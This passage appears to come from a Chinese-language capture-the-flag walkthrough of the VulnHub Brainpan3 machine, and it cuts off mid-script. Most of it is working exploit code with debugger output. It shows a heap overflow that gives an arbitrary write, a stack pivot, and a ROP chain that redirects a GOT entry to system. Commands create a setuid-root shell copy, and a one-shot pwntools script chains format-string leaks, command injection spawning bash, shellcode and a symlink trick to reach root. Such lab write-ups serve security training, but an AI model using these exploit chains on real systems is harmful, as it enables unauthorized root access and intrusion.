<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">with open(<span class="string">&#x27;pwn.msg&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) as f:</span><br><span class="line">    f.write(<span class="string">&#x27;&#123;&#125;|&#123;&#125;\n&#x27;</span>.format(<span class="string">&#x27;a&#x27;</span>*4, <span class="string">&#x27;A&#x27;</span>*10))</span><br><span class="line">    f.write(<span class="string">&#x27;&#123;&#125;|&#123;&#125;\n&#x27;</span>.format(<span class="string">&#x27;b&#x27;</span>*4, <span class="string">&#x27;B&#x27;</span>*10))</span><br><span class="line">    f.write(<span class="string">&#x27;&#123;&#125;|&#123;&#125;\n&#x27;</span>.format(<span class="string">&#x27;b&#x27;</span>*4, <span class="string">&#x27;C&#x27;</span>*10))</span><br></pre></td></tr></table></figure>

<p>运行脚本之后，生成以下的文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan3/2<span class="comment"># ls</span></span><br><span class="line">bofh  bp3.py  brainpan.8  cryptor  make-pwnmsg.py  msg_admin  pwn.msg  report  shell  test.py  trixd</span><br><span class="line">root@kali:~/vulnhub/brainpan3/2<span class="comment"># cat pwn.msg </span></span><br><span class="line">aaaa|AAAAAAAAAA</span><br><span class="line">bbbb|BBBBBBBBBB</span><br><span class="line">bbbb|CCCCCCCCCC</span><br></pre></td></tr></table></figure>

<p>在gdb中执行payload。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; r 1 pwn.msg</span><br><span class="line">Starting program: /root/vulnhub/brainpan3/2/msg_admin 1 pwn.msg</span><br><span class="line">[+] Recording 3 entries</span><br><span class="line">[+] Message from aaaa@kali</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0xf7e48f36 <span class="keyword">in</span> fputs () from /lib32/libc.so.6</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────</span><br><span class="line"> EAX  0xa</span><br><span class="line"> EBX  0x804c300 ◂— <span class="string">&#x27;bbbb&#x27;</span></span><br><span class="line"> ECX  0x0</span><br><span class="line"> EDX  0xffffbebe ◂— 0x0</span><br><span class="line"> EDI  0xa</span><br><span class="line"> ESI  0x0</span><br><span class="line"> EBP  0xffffce68 —▸ 0xffffcef8 —▸ 0xffffd0b8 —▸ 0xffffd2e8 ◂— 0x0</span><br><span class="line"> ESP  0xffffce40 —▸ 0x804c300 ◂— <span class="string">&#x27;bbbb&#x27;</span></span><br><span class="line"> EIP  0xf7e48f36 (fputs+38) ◂— mov    eax, dword ptr [esi]</span><br><span class="line">─────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────</span><br><span class="line"> ► 0xf7e48f36 &lt;fputs+38&gt;     mov    eax, dword ptr [esi]</span><br><span class="line">   0xf7e48f38 &lt;fputs+40&gt;     and    eax, 0x8000</span><br><span class="line">   0xf7e48f3d &lt;fputs+45&gt;     jne    fputs+100 &lt;0xf7e48f74&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7e48f74 &lt;fputs+100&gt;    movsx  edx, byte ptr [esi + 0x46]</span><br><span class="line">   0xf7e48f78 &lt;fputs+104&gt;    <span class="built_in">test</span>   dl, dl</span><br><span class="line">   0xf7e48f7a &lt;fputs+106&gt;    jne    fputs+143 &lt;0xf7e48f9f&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7e48f9f &lt;fputs+143&gt;    mov    ecx, dword ptr [ebp - 0x1c]</span><br><span class="line">   0xf7e48fa2 &lt;fputs+146&gt;    mov    ebx, dword ptr [esi + edx + 0x94]</span><br><span class="line">   0xf7e48fa9 &lt;fputs+153&gt;    lea    eax, [ecx + 0xf80]</span><br><span class="line">   0xf7e48faf &lt;fputs+159&gt;    lea    edx, [ecx + 0x1754]</span><br><span class="line">   0xf7e48fb5 &lt;fputs+165&gt;    mov    ecx, ebx</span><br><span class="line">──────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ esp  0xffffce40 —▸ 0x804c300 ◂— <span class="string">&#x27;bbbb&#x27;</span></span><br><span class="line">... ↓</span><br><span class="line">02:0008│      0xffffce48 —▸ 0xffffd250 —▸ 0xf7ffdab0 —▸ 0xf7fce3e0 —▸ 0xf7ffd950 ◂— ...</span><br><span class="line">03:000c│      0xffffce4c —▸ 0xf7fb5000 ◂— 0x1d6d6c</span><br><span class="line">04:0010│      0xffffce50 —▸ 0xffffcef8 —▸ 0xffffd0b8 —▸ 0xffffd2e8 ◂— 0x0</span><br><span class="line">05:0014│      0xffffce54 —▸ 0xf7fe9450 ◂— pop    edx</span><br><span class="line">06:0018│      0xffffce58 ◂— 0x0</span><br><span class="line">07:001c│      0xffffce5c —▸ 0x804c300 ◂— <span class="string">&#x27;bbbb&#x27;</span></span><br><span class="line">────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0 f7e48f36 fputs+38</span><br><span class="line">   f 1  804892c record_data+271</span><br><span class="line">   f 2  8048a89 notify_admin+193</span><br><span class="line">   f 3  8048d4d main+664</span><br><span class="line">   f 4 f7dfc811 __libc_start_main+241</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">Program received signal SIGSEGV (fault address 0x0)</span><br></pre></td></tr></table></figure>

<p>在静态分析中注意到了一些malloc。看看堆的布局。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; </span><br><span class="line">+0f30 0x804d908  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │....│....│....│....│</span><br><span class="line">...</span><br><span class="line">+0f70 0x804d948  00 00 00 00  11 00 00 00  01 00 00 00  60 d9 04 08  │....│....│....│`...│</span><br><span class="line">+0f80 0x804d958  70 d9 04 08  11 00 00 00  61 61 61 61  00 00 00 00  │p...│....│aaaa│....│</span><br><span class="line">+0f90 0x804d968  00 00 00 00  d1 00 00 00  41 41 41 41  41 41 41 41  │....│....│AAAA│AAAA│</span><br><span class="line">+0fa0 0x804d978  41 41 00 00  00 00 00 00                            │AA..│....│    │    │</span><br><span class="line">pwndbg&gt; </span><br><span class="line">+0f90 0x804d980  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │....│....│....│....│</span><br><span class="line">...</span><br><span class="line">+1000 0x804d9f0  00 00 00 00  00 00 00 00                            │....│....│    │    │</span><br><span class="line">pwndbg&gt; </span><br><span class="line">+0fc0 0x804d9f8  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │....│....│....│....│</span><br><span class="line">...</span><br><span class="line">+1000 0x804da38  00 00 00 00  11 00 00 00  01 00 00 00  50 da 04 08  │....│....│....│P...│</span><br><span class="line">+1010 0x804da48  60 da 04 08  11 00 00 00  62 62 62 62  00 00 00 00  │`...│....│bbbb│....│</span><br><span class="line">+1020 0x804da58  00 00 00 00  d1 00 00 00  42 42 42 42  42 42 42 42  │....│....│BBBB│BBBB│</span><br><span class="line">+1030 0x804da68  42 42 00 00  00 00 00 00                            │BB..│....│    │    │</span><br></pre></td></tr></table></figure>

<p>似乎的每条消息都在堆中背对背。看起来在消息之后还存在两个指针（请参见地址0x804d958和0x804da48）。消息和最后一个指针之间有多少可用空间。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; 0x804da48 - 0x804d970</span><br><span class="line">216</span><br></pre></td></tr></table></figure>

<p>怀疑可以用A溢出两个指针，抛出数据以查看是否可以控制这些指针。</p>
<p>make-pwnmsg.py</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">with open(<span class="string">&#x27;pwn.msg&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) as f:</span><br><span class="line">    f.write(<span class="string">&#x27;&#123;&#125;|&#123;&#125;\n&#x27;</span>.format(<span class="string">&#x27;a&#x27;</span>*4, cyclic(216)))</span><br><span class="line">    f.write(<span class="string">&#x27;&#123;&#125;|&#123;&#125;\n&#x27;</span>.format(<span class="string">&#x27;b&#x27;</span>*4, <span class="string">&#x27;B&#x27;</span>*10))</span><br><span class="line">    f.write(<span class="string">&#x27;&#123;&#125;|&#123;&#125;\n&#x27;</span>.format(<span class="string">&#x27;b&#x27;</span>*4, <span class="string">&#x27;C&#x27;</span>*10))</span><br></pre></td></tr></table></figure>

<p>在gdb中再次执行相同的payload。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; r 1 pwn.msg </span><br><span class="line">Starting program: /root/vulnhub/brainpan3/2/msg_admin 1 pwn.msg</span><br><span class="line">[+] Recording 3 entries</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0xf7e70bb2 <span class="keyword">in</span> ?? () from /lib32/libc.so.6</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────</span><br><span class="line"> EAX  0x62626262 (<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line"> EBX  0x804c300 ◂— <span class="string">&#x27;bbbb&#x27;</span></span><br><span class="line"> ECX  0x804c300 ◂— <span class="string">&#x27;bbbb&#x27;</span></span><br><span class="line"> EDX  0x63616164 (<span class="string">&#x27;daac&#x27;</span>)</span><br><span class="line"> EDI  0xf7fb5000 ◂— 0x1d6d6c</span><br><span class="line"> ESI  0xffffd250 —▸ 0xf7ffdab0 —▸ 0xf7fce3e0 —▸ 0xf7ffd950 ◂— 0x0</span><br><span class="line"> EBP  0xffffd2e8 ◂— 0x0</span><br><span class="line"> ESP  0xffffd0bc —▸ 0x8048cd0 (main+539) ◂— mov    eax, dword ptr [ebp - 0x4c]</span><br><span class="line"> EIP  0xf7e70bb2 ◂— mov    dword ptr [edx], eax</span><br><span class="line">─────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────</span><br><span class="line"> ► 0xf7e70bb2    mov    dword ptr [edx], eax</span><br><span class="line">   0xf7e70bb4    mov    al, byte ptr [ecx + 4]</span><br><span class="line">   0xf7e70bb7    mov    byte ptr [edx + 4], al</span><br><span class="line">   0xf7e70bba    mov    eax, edx</span><br><span class="line">   0xf7e70bbc    ret    </span><br><span class="line"> </span><br><span class="line">   0xf7e70bbd    lea    esi, [esi]</span><br><span class="line">   0xf7e70bc0    mov    eax, dword ptr [ecx]</span><br><span class="line">   0xf7e70bc2    mov    dword ptr [edx], eax</span><br><span class="line">   0xf7e70bc4    mov    ax, word ptr [ecx + 4]</span><br><span class="line">   0xf7e70bc8    mov    word ptr [edx + 4], ax</span><br><span class="line">   0xf7e70bcc    mov    eax, edx</span><br><span class="line">──────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ esp  0xffffd0bc —▸ 0x8048cd0 (main+539) ◂— mov    eax, dword ptr [ebp - 0x4c]</span><br><span class="line">01:0004│      0xffffd0c0 ◂— <span class="string">&#x27;daac&#x27;</span></span><br><span class="line">02:0008│      0xffffd0c4 —▸ 0x804c300 ◂— <span class="string">&#x27;bbbb&#x27;</span></span><br><span class="line">03:000c│      0xffffd0c8 —▸ 0x804c1a0 ◂— 0xfbad2488</span><br><span class="line">04:0010│      0xffffd0cc ◂— <span class="string">&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa&#x27;</span></span><br><span class="line">05:0014│      0xffffd0d0 ◂— <span class="string">&#x27;baaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa&#x27;</span></span><br><span class="line">06:0018│      0xffffd0d4 ◂— <span class="string">&#x27;caaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa&#x27;</span></span><br><span class="line">07:001c│      0xffffd0d8 ◂— <span class="string">&#x27;daaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa&#x27;</span></span><br><span class="line">────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0 f7e70bb2</span><br><span class="line">   f 1  8048cd0 main+539</span><br><span class="line">   f 2 f7dfc811 __libc_start_main+241</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">Program received signal SIGSEGV (fault address 0x63616164)</span><br></pre></td></tr></table></figure>

<p>一定喜欢看到SIGSEGV，是吗？崩溃指令是mov [edx]，eax。看来正在用bbbb（eax-第二条消息）覆盖地址daac（edx-来自循环函数）中的数据。这实际上是“在哪里写”条件，在这里可以在任何地方写入4个字节的内容。查看0x8048cd0（在第1帧处的回溯），看到处于strcpy状态。在此处设置断点并重新启动：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwn&gt; bp 0x8048ccb</span><br><span class="line"></span><br><span class="line">[---------------------------------------CODE----------------------------------------]</span><br><span class="line">=&gt; 0x8048ccb &lt;main+534&gt;    call   0x8048630 &lt;strcpy@plt&gt;</span><br><span class="line">    dest:      0x63616164 (<span class="string">&#x27;daac&#x27;</span>)</span><br><span class="line">    src:       0x804c170 &lt;-- <span class="string">&#x27;bbbb&#x27;</span></span><br></pre></td></tr></table></figure>

<p>在崩溃点，堆栈处于以下状态：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[---------------------------------------STACK---------------------------------------]</span><br><span class="line">00:0000| esp  0xffffc83c --&gt; 0x8048cd0 (main+539) &lt;-- mov    eax, dword ptr [ebp - 0x4c]</span><br><span class="line">01:0004|      0xffffc840 &lt;-- 0x63616164</span><br><span class="line">02:0008|      0xffffc844 --&gt; 0x804c170 &lt;-- <span class="string">&#x27;bbbb&#x27;</span></span><br><span class="line">03:000c|      0xffffc848 --&gt; 0x804c008 &lt;-- 0xfbad2488</span><br><span class="line">04:0010|      0xffffc84c &lt;-- <span class="string">&#x27;aaaabaaacaaadaa...&#x27;</span></span><br><span class="line">05:0014|      0xffffc850 &lt;-- <span class="string">&#x27;baaacaaadaaaeaa...&#x27;</span></span><br><span class="line">06:0018|      0xffffc854 &lt;-- <span class="string">&#x27;caaadaaaeaaafaa...&#x27;</span></span><br><span class="line">07:001c|      0xffffc858 &lt;-- <span class="string">&#x27;daaaeaaafaaagaa...&#x27;</span></span><br></pre></td></tr></table></figure>

<p>在堆栈地址看到了受控缓冲区0xffffc84c,为了将ESP移至缓冲区，需要执行堆栈枢纽操作，以便启动ROP序列。<br>将bbbb设置为从binjitsu（rop.search（move = 20）.address）移动20的堆栈地址，并将daac的偏移量设置为strtok GOT条目。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;msg_admin&#x27;</span>)</span><br><span class="line">rop = ROP(elf)</span><br><span class="line"></span><br><span class="line">pivot = rop.search(move=20).address</span><br><span class="line">strtok = elf.got[<span class="string">&#x27;strtok&#x27;</span>]</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;Pivot: &#123;&#125;&quot;</span>.format(hex(pivot)))</span><br><span class="line">log.info(<span class="string">&quot;Strtok: &#123;&#125;&quot;</span>.format(hex(strtok)))</span><br><span class="line"></span><br><span class="line">with open(<span class="string">&#x27;pwn.msg&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) as f:</span><br><span class="line">    sc = <span class="string">&#x27;A&#x27;</span> * cyclic_find(<span class="string">&#x27;daac&#x27;</span>) + p32(strtok)</span><br><span class="line">    sc += <span class="string">&#x27;B&#x27;</span> * (216 - len(sc))</span><br><span class="line">    f.write(<span class="string">&#x27;&#123;&#125;|&#123;&#125;\n&#x27;</span>.format(<span class="string">&#x27;a&#x27;</span>*4, sc))</span><br><span class="line">    f.write(<span class="string">&#x27;&#123;&#125;|&#123;&#125;\n&#x27;</span>.format(p32(pivot), <span class="string">&#x27;B&#x27;</span>*12))</span><br></pre></td></tr></table></figure>

<p>太棒了，所以现在有了堆栈控制和EIP控制。;-)使用ROPGadget查看相关的ROP小工具。请注意，一定要增加–depth，以便可以看到更多小工具。在这种情况下，这一点很重要。没有它，将无法找到清晰的eax小工具。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ROPgadget --depth 30 --binary msg_admin</span><br></pre></td></tr></table></figure>

<p>列表中的两个小工具非常有趣。下面的小工具将允许使用取消引用的指针来增加eax。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0x08048feb : add eax, dword ptr [ebx + 0x1270304] ; ret</span><br></pre></td></tr></table></figure>

<p>下一个小工具将提供清除eax的方法。请注意，从默认的ROPgadget设置–depth 10中看不到此小工具。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0x08048790 : mov eax, 0x804b074 ; sub eax, 0x804b074 ; sar eax, 2 ; mov edx, eax ; shr edx, 0x1f ; add eax, edx ; sar eax, 1 ; jne 0x80487c1 ; ret</span><br></pre></td></tr></table></figure>

<p>攻击计划如下（剧透警报，几乎与每个CTF ASLR旁路相同）：</p>
<ul>
<li>引用GOT中的条目。</li>
<li>计算给定条目和系统之间的差异。</li>
<li>将此差异添加到取消引用的值中。</li>
<li>调用system（’/tmp/foo’），其中/tmp/foo包含我们的命令。</li>
</ul>
<p>因为要减少添加偏移量指令的数量，所以尝试在msg_admin中找到哪个GOT条目最接近其libc中的系统。</p>
<p>find-good-addr.py</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;msg_admin&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> symbol <span class="keyword">in</span> elf.symbols:</span><br><span class="line">    try:</span><br><span class="line">        <span class="keyword">if</span> libc.symbols[symbol] &lt; libc.symbols[<span class="string">&#x27;system&#x27;</span>]:</span><br><span class="line">            <span class="built_in">print</span> symbol, hex(libc.symbols[<span class="string">&#x27;system&#x27;</span>] - libc.symbols[symbol])</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python find-good-addr.py </span><br><span class="line">__libc_start_main 0x26800</span><br><span class="line">atol 0xe900</span><br></pre></td></tr></table></figure>

<p>为了使事情更简单，将仅在GOT条目中添加正值。使用atol条目，因为它与系统的差异最小。接下来，需要在二进制文件中找到偏移量，该偏移量累积时等于0xe900。下面是一个可能的列表：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0x8048595 = 0xc6e8</span><br><span class="line">0x8048dff = 0x2203</span><br><span class="line">0x8048833 = 0x14</span><br><span class="line">0x8048fb9 = 0x1</span><br></pre></td></tr></table></figure>

<p>现在有了系统偏移量，只需要一个小工具即可执行它。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0x8048786 : call eax;</span><br></pre></td></tr></table></figure>

<p>注意到在用法语句中找到了字符串/tmp/foo。利用它并将其用作执行命令。需要一个或两个命令，当以root身份执行时，将给一个shell。一种方法如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cp /bin/sh /tmp/pwned;</span><br><span class="line">chown root /tmp/pwned;</span><br><span class="line">chmod 4777 /tmp/pwned;</span><br></pre></td></tr></table></figure>

<p>需要将setuid位（4777）设置为puck，以便在root特权下执行二进制文件。一切准备就绪，检查一下最终的ROP链。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">def add_offset(addr):</span><br><span class="line">    <span class="string">&quot;&quot;</span><span class="string">&quot;Function used to easily add offsets to eax to global rop chain&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    add_to_sum = 0x08048feb</span><br><span class="line">    rop.raw(pop_ebx)</span><br><span class="line">    rop.raw(addr - 0x1270304)</span><br><span class="line">    rop.raw(add_to_sum)</span><br><span class="line"></span><br><span class="line">rop = ROP(elf)</span><br><span class="line">tmpfoo = elf.search(<span class="string">&#x27;/tmp/foo&#x27;</span>).next()</span><br><span class="line">atol = elf.got[<span class="string">&#x27;atol&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop_ebx = 0x804859d</span><br><span class="line">call_eax = 0x8048786</span><br><span class="line"></span><br><span class="line">hex_c6e8 = 0x8048595</span><br><span class="line">hex_2203 = 0x8048dff</span><br><span class="line">hex_14 = 0x8048833</span><br><span class="line">hex_1 = 0x8048fb9</span><br><span class="line"></span><br><span class="line">rop.raw(0x8048790)</span><br><span class="line"></span><br><span class="line">add_offset(atol)</span><br><span class="line">add_offset(hex_c6e8)</span><br><span class="line">add_offset(hex_2203)</span><br><span class="line">add_offset(hex_14)</span><br><span class="line">add_offset(hex_1)</span><br><span class="line"></span><br><span class="line">rop.raw(call_eax)    </span><br><span class="line">rop.raw(tmpfoo)</span><br></pre></td></tr></table></figure>

<p>根据先前的挑战，需要通过binjitsu执行这些挑战。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">r.sendline(<span class="string">&#x27;echo &quot;cp /bin/sh /tmp/pwned; chown root /tmp/pwned; chmod 4777 /tmp/pwned&quot; &gt; /tmp/foo&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;chmod +x /tmp/foo&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sc = str(rop)</span><br><span class="line">sc += cyclic(cyclic_find(<span class="string">&#x27;daac&#x27;</span>)-len(sc))</span><br><span class="line">sc += p32(strtok)</span><br><span class="line">sc += <span class="string">&#x27;C&#x27;</span> * (216 - len(sc))</span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">data += <span class="string">&#x27;&#123;&#125;|&#123;&#125;\n&#x27;</span>.format(<span class="string">&#x27;s&#x27;</span>*4, sc) </span><br><span class="line">data += <span class="string">&#x27;&#123;&#125;|&#123;&#125;\n&#x27;</span>.format(p32(pivot), str(rop))</span><br><span class="line"></span><br><span class="line">pwnmsg_file = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> data:</span><br><span class="line">    pwnmsg_file += <span class="string">&#x27;\\x&#123;&#125;&#x27;</span>.format(b.encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">&#x27;&#x27;</span><span class="string">&#x27;python -c &quot;print &#x27;</span>&#123;&#125;<span class="string">&#x27;&quot; &gt;&gt; /opt/.messenger/pwn.msg&#x27;</span><span class="string">&#x27;&#x27;</span>.format(pwnmsg_file))</span><br></pre></td></tr></table></figure>

<p>下面是完善后的一键获取root权限并且拿到flag的python脚本，运行一下看看效果。。。</p>
<p>bp3.py</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;192.168.56.117&#x27;</span></span><br><span class="line">PORT = 1337</span><br><span class="line"></span><br><span class="line">r = remote(HOST, PORT)</span><br><span class="line">r.sendline(<span class="string">&#x27;%d.&#x27;</span> * 6)</span><br><span class="line">r.recvuntil(<span class="string">&quot;ACCESS CODE: &quot;</span>)</span><br><span class="line">output = r.recv()</span><br><span class="line">code = output.split(<span class="string">&#x27;.&#x27;</span>)[2]</span><br><span class="line">log.info(<span class="string">&quot;Code identified: &#123;&#125;&quot;</span>.format(code))</span><br><span class="line">r.sendline(code)</span><br><span class="line">r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">shellcode = <span class="string">&#x27;%x.&#x27;</span> * 70</span><br><span class="line">r.clean()</span><br><span class="line">r.sendline(shellcode)</span><br><span class="line">r.recvuntil(<span class="string">&quot;SESSION: &quot;</span>)</span><br><span class="line">session_name = r.recvuntil(<span class="string">&#x27;\n&#x27;</span>).split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">n_index = session_name.index(<span class="string">&#x27;4e&#x27;</span>)</span><br><span class="line">log.info(<span class="string">&quot;Report &#x27;N&#x27; at offset &#123;&#125;&quot;</span>.format(n_index))</span><br><span class="line">n_index = session_name.index(<span class="string">&#x27;4e&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;Y&#x27;</span> * (4*(n_index-2) + 1) )</span><br><span class="line"><span class="keyword">for</span> <span class="built_in">command</span> <span class="keyword">in</span> [<span class="string">&#x27;uname -a&#x27;</span>, <span class="string">&#x27;whoami&#x27;</span>, <span class="string">&#x27;id&#x27;</span>]:</span><br><span class="line">    r.clean()</span><br><span class="line">    r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;$(&#123;&#125; &gt;&amp;2)&#x27;</span>.format(<span class="built_in">command</span>))</span><br><span class="line"></span><br><span class="line">    r.recvuntil(<span class="string">&quot;SENDING TO REPORT MODULE&quot;</span>)</span><br><span class="line">    output = r.recvuntil(<span class="string">&#x27;[+]&#x27;</span>).split(<span class="string">&#x27;\n&#x27;</span>)[2]</span><br><span class="line">    log.success(<span class="string">&quot;&#123;&#125; - &#123;&#125;&quot;</span>.format(<span class="built_in">command</span>, output))</span><br><span class="line">r.clean()</span><br><span class="line">r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;$(/bin/bash -i &gt;&amp;2)&#x27;</span>)</span><br><span class="line">offset = cyclic_find(<span class="string">&#x27;baaa&#x27;</span>)</span><br><span class="line">shellcode = <span class="string">&#x27;A&#x27;</span> * cyclic_find(<span class="string">&#x27;baaa&#x27;</span>) + p32(0x804a080)</span><br><span class="line">buffer = 116 - len(shellcode)</span><br><span class="line">binsh_shellcode = asm(shellcraft.sh())</span><br><span class="line">argv1 = <span class="string">&#x27;&quot;A&quot; * &#123;&#125; + &quot;&#123;&#125;&quot; + &quot;C&quot; * &#123;&#125;&#x27;</span>.format(offset, r<span class="string">&#x27;\x80\xa0\x04\x08&#x27;</span>, buffer)</span><br><span class="line">argv2 = <span class="string">&#x27;&#x27;</span>.join(<span class="string">&#x27;\\x&#123;&#125;&#x27;</span>.format(enhex(binsh_shellcode)[x:x+2]) <span class="keyword">for</span> x <span class="keyword">in</span> xrange(0, len(enhex(binsh_shellcode)), 2))</span><br><span class="line">actual_shellcode = <span class="string">&quot;&quot;</span><span class="string">&quot;./cryptor <span class="subst">$(python -c &#x27;print &#123;&#125;&#x27;)</span> <span class="subst">$(python -c &#x27;print <span class="string">&quot;&#123;&#125;&quot;</span>&#x27;)</span>&quot;</span><span class="string">&quot;&quot;</span>.format(argv1, argv2)</span><br><span class="line">log.info(actual_shellcode)</span><br><span class="line">r.sendline(<span class="string">&#x27;cd /home/reynard/private&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    r.clean()</span><br><span class="line">    r.sendline(actual_shellcode)</span><br><span class="line">    r.clean()</span><br><span class="line">    r.sendline(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">    output = r.recv()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;reynard&#x27;</span> <span class="keyword">in</span> output:</span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line">log.info(<span class="string">&quot;Shell recevied: reynard&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;&quot;</span><span class="string">&quot; echo &quot;</span></span><br><span class="line">import os</span><br><span class="line">import socket</span><br><span class="line">import telnetlib</span><br><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;localhost&#x27;</span></span><br><span class="line">PORT = 7075</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    os.remove(<span class="string">&#x27;/mnt/usb/key.txt&#x27;</span>)</span><br><span class="line">except:</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">subprocess.check_output([<span class="string">&#x27;touch&#x27;</span>, <span class="string">&#x27;/mnt/usb/key.txt&#x27;</span>])</span><br><span class="line"></span><br><span class="line">r = socket.socket()</span><br><span class="line">r.connect((HOST, PORT))</span><br><span class="line"></span><br><span class="line">os.remove(<span class="string">&#x27;/mnt/usb/key.txt&#x27;</span>)</span><br><span class="line">os.symlink(<span class="string">&#x27;/home/puck/key.txt&#x27;</span>, <span class="string">&#x27;/mnt/usb/key.txt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">t = telnetlib.Telnet()</span><br><span class="line">t.sock = r</span><br><span class="line">t.interact()</span><br><span class="line"></span><br><span class="line">r.close()</span><br><span class="line"><span class="string">&quot; &gt; win.py</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;python win.py&quot;</span>)</span><br><span class="line">r.clean()</span><br><span class="line">r.sendline(<span class="string">&quot;whoami&quot;</span>)</span><br><span class="line">output = r.recv()</span><br><span class="line">log.success(<span class="string">&quot;Shell received: &#123;&#125;&quot;</span>.format(output))</span><br><span class="line">sleep(1)</span><br><span class="line">log.success(<span class="string">&quot;Insert ROP pun here...&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;msg_admin&#x27;</span>)</span><br><span class="line">rop = ROP(elf)</span><br><span 